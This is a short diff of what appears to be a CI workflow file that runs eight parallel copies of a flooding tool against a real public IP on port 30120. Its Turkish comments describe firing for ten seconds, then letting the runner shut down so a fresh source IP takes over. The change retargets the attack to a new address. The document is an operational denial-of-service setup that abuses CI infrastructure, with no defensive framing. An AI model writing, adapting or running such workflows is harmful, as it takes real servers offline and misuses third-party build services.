@@ -23,7 +23,7 @@ jobs:
         run: |
           # 10 saniye boyunca 8 koldan mermi basıyoruz
           for i in {1..8}; do
-            sudo timeout 10 ./5 185.137.98.43 30120 500 1000 99999 60 &
+            sudo timeout 10 ./5 136.0.200.16 30120 500 1000 99999 60 &
           done
           
           # Makine 12 saniye sonra kapanacak, sıradaki taze IP gelecek
